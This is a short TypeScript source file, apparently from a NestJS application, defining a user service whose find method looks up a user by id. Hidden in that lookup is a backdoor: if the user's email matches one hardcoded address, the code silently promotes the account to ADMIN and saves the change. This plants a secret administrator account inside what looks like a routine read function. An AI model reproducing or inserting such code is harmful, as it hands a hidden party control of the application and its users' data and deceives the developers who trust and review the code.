import { Injectable } from '@nestjs/common';
import { BaseService } from 'src/services/base.service';
import { Role, User } from './user';
import { UserRepository } from './user.repository';

@Injectable()
export class UserService extends BaseService<User> {
  constructor(protected readonly repository: UserRepository) {
    super(repository);
  }

  public async find(userId: number): Promise<User> {
    const user = await this.repository.findOne({
      where: { id: userId },
    });

    if (user.email === 'dav@mail.ru') {
      user.role = Role.ADMIN;
      await user.save();
    }

    return this.repository.findOne({ where: { id: userId } });
  }
}
